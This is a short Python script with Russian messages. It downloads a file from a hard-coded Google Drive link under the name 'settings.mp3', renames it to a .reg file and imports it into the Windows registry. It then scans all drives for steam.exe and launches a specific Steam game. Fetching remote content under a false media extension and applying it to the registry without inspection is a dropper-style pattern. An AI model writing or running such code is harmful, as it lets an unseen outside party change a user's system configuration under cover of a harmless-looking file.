import os
import urllib.request
import subprocess
import shutil
import psutil


def download_file(url, download_dir):
    local_filename = os.path.join(download_dir, "settings.mp3")
    with urllib.request.urlopen(url) as response:
        with open(local_filename, "wb") as out_file:
            shutil.copyfileobj(response, out_file)
    print(f"Файл скачан в {local_filename}")
    return local_filename


def rename_mp3_to_reg(mp3_file_path):
    reg_file_path = mp3_file_path.replace(".mp3", ".reg")
    try:
        os.rename(mp3_file_path, reg_file_path)
        print(f"Файл {mp3_file_path} переименован в {reg_file_path}")
        return reg_file_path
    except Exception as e:
        print(f"Ошибка при переименовании файла: {e}")
        return None


def import_registry_file(reg_file_path):
    try:
        subprocess.run(["reg", "import", reg_file_path], check=True)
        print(f"Реестр успешно обновлен с файлом {reg_file_path}")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при импорте реестра: {e}")


def find_steam_path():
    possible_paths = []

    print("Начинаем поиск Steam.exe по всем доступным дискам...\n")

    drives = psutil.disk_partitions()

    for drive in drives:
        drive_path = drive.mountpoint
        print(f"Ищем на диске: {drive_path}...")

        for root, dirs, files in os.walk(drive_path):
            if "steam.exe" in files:
                steam_path = os.path.join(root, "steam.exe")
                possible_paths.append(steam_path)
                print(f"Найден Steam по пути: {steam_path}")

    if possible_paths:
        print("\nПоиск завершен. Найдены следующие пути к steam.exe:")
        for path in possible_paths:
            print(path)
        return possible_paths
    else:
        print("\nSteam.exe не найдено на компьютере.")
        return None


def launch_steam_game(steam_game_id):
    steam_paths = find_steam_path()
    if not steam_paths:
        print("Steam не найден на этом компьютере.")
        return

    steam_path = steam_paths[0]
    print(f"Используем Steam по пути: {steam_path}")

    try:
        print(f"Запуск игры с командой: {steam_path} steam://rungameid/{steam_game_id}")

        subprocess.run([steam_path, f"steam://rungameid/{steam_game_id}"], check=True)
        print("Игра успешно запущена.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при запуске Steam: {e}")
    except Exception as e:
        print(f"Произошла ошибка: {e}")


def main():
    url = "https://drive.google.com/uc?export=download&id=18Yr6wfSAJZTqhttMFVDNx7pZkez2vJBq"

    game_dir = os.getcwd()

    mp3_file_path = download_file(url, game_dir)

    reg_file_path = rename_mp3_to_reg(mp3_file_path)

    if reg_file_path:
        import_registry_file(reg_file_path)

        steam_game_id = "1568590"
        launch_steam_game(steam_game_id)


if __name__ == "__main__":
    main()
